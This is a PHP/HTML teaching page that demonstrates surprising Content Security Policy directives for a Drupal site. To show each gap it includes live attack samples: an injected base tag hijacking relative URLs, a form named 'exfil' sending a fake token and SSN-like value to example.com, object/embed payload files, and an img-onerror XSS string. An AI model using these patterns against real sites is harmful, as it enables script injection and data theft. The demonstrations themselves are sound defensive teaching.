<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Advanced CSP Demo</title>
  <meta name="description" content="Demonstrations of the CSP directives that behave unexpectedly.">
  <meta name="author" content="John Brandenburg">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<?php if ($inject_base) { ?>
  <!--
    Injected <base> tag. This is what an attacker gets from a single injected
    element: every relative URL on the page now resolves against their host.
    base-uri is the only directive that stops it, and it does not inherit from
    default-src.
  -->
  <base href="https://picsum.photos/">
<?php } ?>
  <script <?php echo $nonce_attribute; ?>>
    // Registered first thing so violations raised while the document is still
    // parsing are captured. The page-bottom script drains this buffer.
    window.__cspBuf = [];
    document.addEventListener('securitypolicyviolation', function (e) {
      window.__cspBuf.push(e);
    });
  </script>
  <link rel="stylesheet" href="/demo/css/normalize.css">
  <link rel="stylesheet" href="/demo/css/skeleton.css">
  <link rel="stylesheet" href="/demo/css/custom.css">
  <style <?php echo $nonce_attribute; ?>>
    .status { display:inline-block; padding:2px 10px; border-radius:3px;
              font-size:12px; font-weight:600; letter-spacing:.5px; text-transform:uppercase; }
    .status-wait    { background:#eee; color:#666; }
    .status-ran     { background:#c0392b; color:#fff; }
    .status-blocked { background:#27ae60; color:#fff; }
    .status-info    { background:#2980b9; color:#fff; }
    .vlog { background:#111; color:#eee; font-family:monospace; font-size:12px;
            padding:10px; max-height:170px; overflow:auto; border-radius:3px; }
    .vlog div { padding:1px 0; }
    .vlog .empty { color:#7f8c8d; }
    .case { border-left:4px solid #ddd; padding-left:14px; margin-bottom:8px; }
    .case.active { border-left-color:#c0392b; }
    .navbar-list { flex-wrap:wrap; }
    .policy { word-break:break-all; }
    .muted { color:#777; font-size:.9em; }
  </style>
</head>
<body>

<div class="container">
  <nav class="navbar">
    <ul class="navbar-list">
      <li class="navbar-item"><a class="navbar-link" href="/demo/advanced.php?csp=none">No CSP</a></li>
      <li class="navbar-item"><a class="navbar-link" href="/demo/index.php">&larr; Basic demo</a></li>
      <li class="navbar-item"><a class="navbar-link" href="/">Back to Drupal</a></li>
    </ul>
  </nav>

  <h1>Advanced CSP Demo</h1>
  <p>The <a href="/demo/index.php">basic demo</a> covers which hosts may serve
    scripts, styles, images and frames. This page covers the directives that
    don't behave the way that mental model predicts.</p>

  <h5>Directives that do <em>not</em> inherit from <code>default-src</code></h5>
  <p class="muted">Each pair below is the same policy with and without the directive under test.</p>
  <ul class="navbar-list">
    <li class="navbar-item"><a class="navbar-link" href="?csp=form-action-absent">form-action: absent</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=form-action">form-action: set</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=base-uri-absent">base-uri: absent</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=base-uri">base-uri: none</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=frame-ancestors-absent">frame-ancestors: absent</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=frame-ancestors">frame-ancestors: none</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=sandbox">sandbox</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=upgrade-insecure">upgrade-insecure-requests</a></li>
  </ul>

  <h5>Directives that cover more than you think</h5>
  <ul class="navbar-list">
    <li class="navbar-item"><a class="navbar-link" href="?csp=object-src-absent">object-src: absent</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=object-src">object-src: none</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=connect-src">connect-src vs strict-dynamic</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=worker-via-child-src">worker via child-src</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=worker-src">worker-src: none</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=script-attr">script-src-attr vs -elem</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=trusted-types">Trusted Types</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=double-header">two CSP headers</a></li>
  </ul>

  <hr />

  <h3>Response headers being sent</h3>
<?php if ($csp) { ?>
  <p><code class="code-block policy"><?php echo htmlspecialchars($csp); ?></code></p>
<?php   if ($extra_csp) { ?>
  <p><code class="code-block policy"><?php echo htmlspecialchars($extra_csp); ?></code></p>
  <p class="muted">Two <code>Content-Security-Policy</code> headers. Both are
    enforced independently, so a resource must satisfy <strong>both</strong>.</p>
<?php   } ?>
<?php } else { ?>
  <p>No Content Security Policy.</p>
<?php } ?>

  <h5>Violations reported by this page</h5>
  <div class="vlog" id="vlog"><div class="empty">none yet</div></div>

  <hr />

  <!-- ============================ form-action ============================ -->
  <div class="case <?php echo strpos($csp_option, 'form-action') === 0 ? 'active' : ''; ?>">
    <h2>form-action <span class="status status-wait" id="s-form">submit to test</span></h2>
    <p><code>form-action</code> restricts where a form may submit. It is a
      <em>navigation</em> directive, not a fetch directive, so it does
      <strong>not</strong> fall back to <code>default-src</code>.</p>
    <p>The form below posts to an off-site host. Under
      <a href="?csp=form-action-absent"><code>default-src 'self'</code> alone</a>
      it submits happily, with nothing in the console. Only
      <a href="?csp=form-action"><code>form-action 'self'</code></a> stops it.</p>
    <form id="exfil" method="GET" action="https://example.com/collect" target="_blank">
      <input type="hidden" name="session" value="pretend-this-is-a-token">
      <label>Data an attacker would like to have
        <input type="text" name="data" value="123-45-6789">
      </label>
      <button class="button-primary" type="submit">Submit off-site</button>
    </form>
    <p class="muted">Opens in a new tab so you don't lose your place. Check the
      address bar of that tab &mdash; the values went with it.</p>
  </div>

  <hr />

  <!-- ============================== base-uri ============================= -->
  <div class="case <?php echo strpos($csp_option, 'base-uri') === 0 ? 'active' : ''; ?>">
    <h2>base-uri <span class="status status-wait" id="s-base">&hellip;</span></h2>
    <p>One injected <code>&lt;base&gt;</code> tag reroutes every relative URL on
      the page &mdash; scripts included. This is how a single injected element
      escalates into full script control. <code>base-uri</code> also does not
      inherit from <code>default-src</code>.</p>
    <p>The image below is written as
      <code>&lt;img src="images/moustache-cakes.jpeg"&gt;</code>. Its
      <em>resolved</em> URL is:</p>
    <p><code class="code-block policy" id="base-resolved">&hellip;</code></p>
    <img id="relimg" src="images/moustache-cakes.jpeg" width="208" height="156" alt="relative-path image">
    <p class="muted">Compare <a href="?csp=base-uri-absent">base-uri absent</a>
      (URL is hijacked) with <a href="?csp=base-uri">base-uri 'none'</a>
      (the <code>&lt;base&gt;</code> tag is ignored and a violation fires).</p>
    <p class="muted">On the hijacked page, scroll down: the worker and
      <code>&lt;object&gt;</code> sections have broken too. Even root-relative
      URLs like <code>/demo/assets/worker.js</code> resolve against the injected
      base's <em>origin</em>, so one tag rerouted every asset on the page. That
      is the whole attack.</p>
  </div>

  <hr />

  <!-- =========================== frame-ancestors ========================= -->
  <div class="case <?php echo strpos($csp_option, 'frame-ancestors') === 0 ? 'active' : ''; ?>">
    <h2>frame-ancestors <span class="status status-info" id="s-fa">open the framing test</span></h2>
    <p>Controls who may embed <em>this</em> page &mdash; the anti-clickjacking
      directive. It supersedes <code>X-Frame-Options</code>, does not inherit
      from <code>default-src</code>, and is <strong>silently ignored</strong> if
      you deliver it in a <code>&lt;meta&gt;</code> tag rather than a header.</p>
    <p><a class="button" href="/demo/frame-test.php?csp=frame-ancestors-absent" target="_blank">Framing test: absent</a>
       <a class="button" href="/demo/frame-test.php?csp=frame-ancestors" target="_blank">Framing test: 'none'</a></p>
  </div>

  <hr />

  <!-- ============================= connect-src =========================== -->
  <div class="case <?php echo $csp_option === 'connect-src' ? 'active' : ''; ?>">
    <h2>connect-src <span class="status status-wait" id="s-connect">click to test</span></h2>
    <p><code>'strict-dynamic'</code> propagates trust for <strong>script
      loading only</strong>. It has no effect on <code>connect-src</code>. Ad and
      analytics tags are mostly beacons, which is exactly the traffic it doesn't
      cover.</p>
    <p>The <a href="?csp=connect-src">connect-src case</a> uses the full strict
      CSP recipe &mdash; nonce plus <code>'strict-dynamic'</code> &mdash; and
      still blocks this beacon.</p>
    <p><button class="button-primary" id="beacon">Send beacon to ad.doubleclick.net</button></p>
    <p class="muted">The violation fires before the network request, so this
      works with no internet connection.</p>
  </div>

  <hr />

  <!-- ======================== worker-src / child-src ===================== -->
  <div class="case <?php echo strpos($csp_option, 'worker') === 0 ? 'active' : ''; ?>">
    <h2>worker-src <span class="status status-wait" id="s-worker">&hellip;</span></h2>
    <p><code>worker-src</code> falls back to <code>child-src</code>, then
      <code>script-src</code>, then <code>default-src</code>. So a
      <code>child-src</code> entry that looks dead &mdash; because
      <code>frame-src</code> took over frame duty &mdash; is still the directive
      deciding whether workers may start.</p>
    <p><a href="?csp=worker-via-child-src">worker via child-src</a> has no
      <code>worker-src</code> at all, and the worker runs because
      <code>child-src 'self'</code> permits it.
      <a href="?csp=worker-src">worker-src 'none'</a> is the same policy with the
      specific directive added, and the worker dies.</p>
    <p class="muted">Note: a worker cannot be loaded cross-origin in the first
      place &mdash; that's same-origin policy, not CSP. This is about whether
      workers run at all, not about which host they come from.</p>
    <p class="muted">This section also reports blocked under
      <a href="?csp=trusted-types">Trusted Types</a> and
      <a href="?csp=sandbox">sandbox</a>, for unrelated reasons:
      <code>new Worker(string)</code> is itself a Trusted Types sink, and a
      sandboxed opaque origin can't load a same-origin script.</p>
  </div>

  <hr />

  <!-- ==================== script-src-attr vs script-src-elem ============= -->
  <div class="case <?php echo $csp_option === 'script-attr' ? 'active' : ''; ?>">
    <h2>script-src-attr vs -elem <span class="status status-wait" id="s-attr">click the button</span></h2>
    <p>The granular split. A <code>&lt;script&gt;</code> block and an
      <code>onclick=</code> attribute are governed by different directives, which
      is why a hash that covers one does nothing for the other.</p>
    <p>Under <a href="?csp=script-attr">this case</a>,
      <code>script-src-elem 'self' 'unsafe-inline'</code> lets the page's script
      blocks run, while <code>script-src-attr 'none'</code> kills the handler:</p>
    <p><button class="button" id="attrbtn" onclick="window.__attrFired = true; document.getElementById('attr-out').textContent = 'The onclick handler ran.';">Inline onclick= handler</button></p>
    <p><span id="attr-out" class="muted">(handler has not run)</span></p>
  </div>

  <hr />

  <!-- ============================== object-src =========================== -->
  <div class="case <?php echo strpos($csp_option, 'object-src') === 0 ? 'active' : ''; ?>">
    <h2>object-src <span class="status status-wait" id="s-object">&hellip;</span></h2>
    <p>Flash is the reason this directive exists, but it is not the reason it's
      still in the recommended policy. <code>&lt;object&gt;</code> and
      <code>&lt;embed&gt;</code> load documents that <strong>execute
      script</strong>, and <code>script-src</code> does not govern them.</p>
    <p>Both boxes below are same-origin files. Under
      <a href="?csp=object-src-absent"><code>default-src 'self'</code></a> their
      scripts run. Anyone who can get an HTML or SVG file onto your origin &mdash;
      a file upload, a webform attachment &mdash; gets script execution that
      <code>script-src</code> never sees.
      <a href="?csp=object-src"><code>object-src 'none'</code></a> closes it.</p>
    <div class="row">
      <div class="one-half column">
        <p class="muted">&lt;object type="text/html"&gt;</p>
        <object type="text/html" data="/demo/assets/payload.html" width="260" height="80"></object>
      </div>
      <div class="one-half column">
        <p class="muted">&lt;embed type="image/svg+xml"&gt; &mdash; an
          <code>&lt;img&gt;</code> would <em>not</em> run this script.</p>
        <embed type="image/svg+xml" src="/demo/assets/payload.svg" width="120" height="120">
      </div>
    </div>
  </div>

  <hr />

  <!-- =========================== two CSP headers ========================= -->
  <div class="case <?php echo $csp_option === 'double-header' ? 'active' : ''; ?>">
    <h2>Two CSP headers <span class="status status-wait" id="s-double">&hellip;</span></h2>
    <p>Send two <code>Content-Security-Policy</code> headers and both are
      enforced. The effective policy is their <strong>intersection</strong>, not
      their union &mdash; a resource must be permitted by every policy in force.</p>
    <p>This is the operational sting in "your header is not your config": if your
      CDN or web server sets a policy and Drupal sets another, adding a host in
      the Drupal admin UI changes nothing, because the other policy still rejects
      it. Nothing in Drupal will tell you why.</p>
    <p>Under <a href="?csp=double-header">two CSP headers</a>, the first header
      allows <code>picsum.photos</code> and the second omits it. The image below
      is blocked:</p>
    <img id="extimg" src="https://picsum.photos/208/156" width="208" height="156" alt="external image">
  </div>

  <hr />

  <!-- ===================== upgrade-insecure-requests ====================== -->
  <div class="case <?php echo $csp_option === 'upgrade-insecure' ? 'active' : ''; ?>">
    <h2>upgrade-insecure-requests <span class="status status-wait" id="s-upgrade">&hellip;</span></h2>
    <p>Rewrites <code>http://</code> subresource URLs to <code>https://</code>
      before the request is made. Takes no value, and does not inherit from
      anything.</p>
    <p><strong>This one has largely been overtaken by the browsers.</strong> The
      image below is written as <code>src="http://picsum.photos/&hellip;"</code>.
      Watch the network panel with
      <a href="?csp=none">no CSP at all</a> and the request still goes out over
      <code>https</code> &mdash; Chrome auto-upgrades mixed-content images, audio
      and video on its own, and blocks mixed <em>active</em> content (scripts,
      iframes, XHR) outright rather than upgrading it.</p>
    <p>So this directive is worth understanding mainly so you can tell when
      advice you're reading predates that change. It still does real work for
      the cases auto-upgrade doesn't cover, and it sends the
      <code>Upgrade-Insecure-Requests: 1</code> request header.</p>
    <p><code class="code-block policy" id="upgrade-resolved">&hellip;</code></p>
    <img id="httpimg" src="http://picsum.photos/208/156" width="208" height="156" alt="http image">
  </div>

  <hr />

  <!-- =============================== sandbox ============================= -->
  <div class="case <?php echo $csp_option === 'sandbox' ? 'active' : ''; ?>">
    <h2>sandbox <span class="status status-wait" id="s-sandbox">&hellip;</span></h2>
    <p>The <code>&lt;iframe sandbox&gt;</code> attribute, applied to a top-level
      document by a header. <a href="?csp=sandbox">This case</a> sends
      <code>sandbox allow-scripts</code>, so scripts still run but the document
      is pushed into an <strong>opaque origin</strong> &mdash; forms are blocked,
      popups are blocked, and same-origin storage access is gone.</p>
    <p class="muted">Worth knowing mostly so you recognise what happened when a
      page mysteriously loses <code>localStorage</code> and cookies.</p>
    <p>Document origin: <code id="sandbox-origin">&hellip;</code></p>
    <p class="muted">While this case is active, scroll back up and press the
      <strong>form-action</strong> submit button. Nothing happens at all &mdash;
      no navigation, no new tab, and the status badge never even changes,
      because the submission is blocked before the <code>submit</code> event
      fires. Silent failure is the thing to recognise here.</p>
  </div>

  <hr />

  <!-- ============================ Trusted Types ========================== -->
  <div class="case <?php echo $csp_option === 'trusted-types' ? 'active' : ''; ?>">
    <h2>Trusted Types <span class="status status-wait" id="s-tt">click to test</span></h2>
    <p><code>require-trusted-types-for 'script'</code> locks the DOM-XSS sinks.
      Assigning a plain string to <code>innerHTML</code> throws a
      <code>TypeError</code> instead of parsing it &mdash; the value has to go
      through a named policy where you actually sanitise it.</p>
    <p>This is a different <em>kind</em> of protection from the rest of CSP: it
      doesn't allow-list sources, it constrains what your own code may do with
      untrusted strings.</p>
    <p><button class="button-primary" id="ttbtn">Write &lt;img onerror&gt; to innerHTML</button></p>
    <p><span id="tt-out" class="muted">(not yet attempted)</span></p>
    <div id="tt-sink" style="border:1px dashed #ccc;padding:6px;min-height:28px"></div>
  </div>

  <hr />
  <p class="muted">Every case changes one directive against the same permissive
    baseline, so the directive under test is the only variable.</p>
  <br />
</div>

<script <?php echo $nonce_attribute; ?>>
(function () {
  'use strict';

  // Trusted Types is one of the cases, so nothing here may use innerHTML.
  function set(id, state, text) {
    var el = document.getElementById(id);
    if (!el) { return; }
    el.className = 'status status-' + state;
    el.textContent = text;
  }
  function text(id, s) {
    var el = document.getElementById(id);
    if (el) { el.textContent = s; }
  }

  // --- violation log ---------------------------------------------------
  var log = document.getElementById('vlog');
  var seen = 0;
  function record(e) {
    if (seen === 0) { log.textContent = ''; }
    seen++;
    var row = document.createElement('div');
    row.textContent = e.effectiveDirective + '  ←  ' +
      (e.blockedURI || '(inline)') +
      (e.disposition === 'report' ? '   [report-only]' : '');
    log.appendChild(row);
    log.scrollTop = log.scrollHeight;
  }
  // Drain anything raised during parsing, then keep listening.
  (window.__cspBuf || []).forEach(record);
  document.addEventListener('securitypolicyviolation', record);

  // --- base-uri --------------------------------------------------------
  var relimg = document.getElementById('relimg');
  if (relimg) {
    var resolved = relimg.src;
    text('base-resolved', resolved);
    var hijacked = resolved.indexOf(location.origin) !== 0;
    set('s-base', hijacked ? 'ran' : 'blocked',
        hijacked ? 'URL hijacked' : 'resolves to this origin');
  }

  // --- upgrade-insecure-requests ---------------------------------------
  // The DOM src property reflects the attribute, not the request the browser
  // actually made, so whether the image loaded is the only reliable signal.
  // On an https page an un-upgraded http:// subresource is mixed content and
  // is blocked by the browser regardless of CSP.
  var httpimg = document.getElementById('httpimg');
  if (httpimg) {
    setTimeout(function () {
      var loaded = httpimg.naturalWidth > 0;
      text('upgrade-resolved', 'markup says ' + httpimg.getAttribute('src') +
        '  —  ' + (loaded
          ? 'loaded (the request went out over https)'
          : 'did not load (this policy does not allow the image host at all)'));
      set('s-upgrade', loaded ? 'info' : 'blocked',
          loaded ? 'request upgraded to https' : 'blocked by img-src');
    }, 2000);
  }

  // --- sandbox ---------------------------------------------------------
  var sandboxed = (location.origin === 'null' || origin === 'null');
  text('sandbox-origin', String(location.origin));
  set('s-sandbox', sandboxed ? 'ran' : 'wait',
      sandboxed ? 'opaque origin' : 'normal origin');

  // --- object-src ------------------------------------------------------
  var objRan = {}, objTimer;
  window.addEventListener('message', function (e) {
    if (e.data === 'object-html-script-ran') { objRan.html = true; }
    if (e.data === 'object-svg-script-ran') { objRan.svg = true; }
  });
  objTimer = setTimeout(function () {
    var n = (objRan.html ? 1 : 0) + (objRan.svg ? 1 : 0);
    set('s-object', n ? 'ran' : 'blocked',
        n ? n + ' of 2 payload scripts ran' : 'both blocked');
  }, 1800);

  // --- worker-src ------------------------------------------------------
  try {
    var w = new Worker('/demo/assets/worker.js');
    var wTimer = setTimeout(function () { set('s-worker', 'blocked', 'worker never started'); }, 1500);
    w.onmessage = function () { clearTimeout(wTimer); set('s-worker', 'ran', 'worker running'); };
    w.onerror = function () { clearTimeout(wTimer); set('s-worker', 'blocked', 'worker blocked'); };
  }
  catch (err) {
    set('s-worker', 'blocked', 'blocked: ' + err.name);
  }

  // --- two CSP headers -------------------------------------------------
  var ext = document.getElementById('extimg');
  if (ext) {
    setTimeout(function () {
      var ok = ext.naturalWidth > 0;
      set('s-double', ok ? 'ran' : 'blocked', ok ? 'external image loaded' : 'external image blocked');
    }, 1800);
  }

  // --- connect-src -----------------------------------------------------
  var beacon = document.getElementById('beacon');
  if (beacon) {
    beacon.addEventListener('click', function () {
      set('s-connect', 'wait', 'sending…');
      fetch('https://ad.doubleclick.net/ccm/s/collect?demo=1', { mode: 'no-cors' })
        .then(function () { set('s-connect', 'ran', 'beacon sent — not blocked'); })
        .catch(function (err) { set('s-connect', 'blocked', 'blocked by connect-src'); });
    });
  }

  // --- script-src-attr -------------------------------------------------
  var attrbtn = document.getElementById('attrbtn');
  if (attrbtn) {
    attrbtn.addEventListener('click', function () {
      setTimeout(function () {
        var fired = window.__attrFired === true;
        set('s-attr', fired ? 'ran' : 'blocked',
            fired ? 'onclick= ran' : 'onclick= blocked, this listener still works');
      }, 120);
    });
  }

  // --- Trusted Types ---------------------------------------------------
  var ttbtn = document.getElementById('ttbtn');
  if (ttbtn) {
    ttbtn.addEventListener('click', function () {
      var sink = document.getElementById('tt-sink');
      try {
        sink.innerHTML = '<img src="x" onerror="document.getElementById(\'tt-out\').textContent = \'XSS payload executed.\'">';
        text('tt-out', 'innerHTML assignment was allowed.');
        set('s-tt', 'ran', 'innerHTML allowed');
      }
      catch (err) {
        text('tt-out', err.name + ': ' + err.message);
        set('s-tt', 'blocked', 'innerHTML refused');
      }
    });
  }

  // --- form-action -----------------------------------------------------
  var form = document.getElementById('exfil');
  if (form) {
    form.addEventListener('submit', function () {
      set('s-form', 'wait', 'submitting…');
      setTimeout(function () {
        // A blocked submission raises a violation; the log above will show it.
        set('s-form', seen > 0 ? 'blocked' : 'ran',
            seen > 0 ? 'submission blocked' : 'submitted off-site');
      }, 900);
    });
  }
}());
</script>
</body>
</html>
